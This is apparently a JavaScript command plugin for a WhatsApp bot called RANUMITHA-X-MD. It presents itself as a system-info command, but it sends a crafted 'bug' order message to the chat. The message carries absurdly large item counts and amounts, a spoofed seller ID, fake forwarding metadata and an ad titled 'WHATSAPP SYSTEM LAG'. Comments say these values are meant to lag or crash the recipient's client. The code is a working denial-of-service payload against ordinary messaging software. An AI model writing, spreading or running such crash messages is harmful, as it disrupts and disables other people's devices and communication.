const { cmd } = require('../command');
const config = require('../config');
const os = require("os");
const axios = require("axios"); // රූපය download කර ගැනීමට අවශ්‍යයි
const { runtime } = require('../lib/functions');

cmd({
    pattern: "baga",
    alias: ["sinfo", "platfhorm", "systehmstatus", "systemjinfo"],
    react: "🧬",
    desc: "Check bot system status with high-load bug style.",
    category: "main",
    filename: __filename
},
async (robin, mek, m, {
    from, quoted, reply, sender
}) => {
    try {
        // System Data
        const uptimeStr = runtime(process.uptime());
        const usedRam = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
        
        const statusText = `╭─〔 *🍷 SYSTEM INFO 🍷*〕─◉
│
│⏰ *Uptime*: ${uptimeStr}
│⏳ *Ram*: ${usedRam}MB / ${totalRam}MB
│🖥 *Host*: ${os.hostname()}
│🖊 *Prefix*: [ ${config.PREFIX} ]
│🛠 *Mode*: [ ${config.MODE} ] 
│🤵‍♂ *Owner*: ᴴᴵᴿᵁᴷᴬ ᴿᴬᴺᵁᴹᴵᵀ𝐇𝐀
│🧬 *Version*: ${config.BOT_VERSION}
╰─────────────────────────────⊷
> © Powerd by 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 🌛`;

        // Invalid Media Type error එක නැති කිරීමට රූපය Buffer එකක් ලෙස ලබා ගැනීම
        const imgUrl = "https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/System%20%20info.jpg";
        const response = await axios.get(imgUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        // Crash/Bug Message sending logic
        await robin.sendMessage(from, {
            orderMessage: {
                itemCount: 99999999999, // High value for lag
                status: 1,
                surface: 1,
                message: statusText,
                orderTitle: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗦𝗬𝗦𝗧𝗘𝗠', 
                sellerJid: '0@s.whatsapp.net',
                token: 'AR6x+VogDsm_v09yS90CC63yF7f7uI7S0+OMU79asZt370=', 
                totalAmount1000: 9999999999999,
                totalCurrencyCode: 'LKR',
                contextInfo: {
                    mentionedJid: [sender],
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363317972190466@newsletter',
                        newsletterName: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗕𝗨𝗚 𝗖𝗘𝗡𝗧𝗘𝗥',
                        serverMessageId: 143
                    },
                    externalAdReply: {
                        title: "⚠️ 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐀𝐆 ⚠️",
                        body: "ᴄʀᴀsʜɪɴɢ ᴘʀᴏᴄᴇss sᴛᴀʀᴛᴇᴅ...",
                        mediaType: 1,
                        thumbnail: buffer, // URL එක වෙනුවට සෘජු Buffer එක දීමෙන් Media Error එක නැතිවේ
                        sourceUrl: "https://whatsapp.com/channel/0029Vafn96S7z4k66VvX9O0A",
                        renderLargerThumbnail: false // Crash එක වැඩි කිරීමට මෙය false කරන්න
                    }
                }
            }
        }, { quoted: mek });

    } catch (e) {
        console.log("System Bug Style Error:", e);
        // Error එකක් ආවොත් සාමාන්‍ය ක්‍රමයට යැවීම
        reply(`⚠️ Bug Info: ${e.message}`);
    }
});
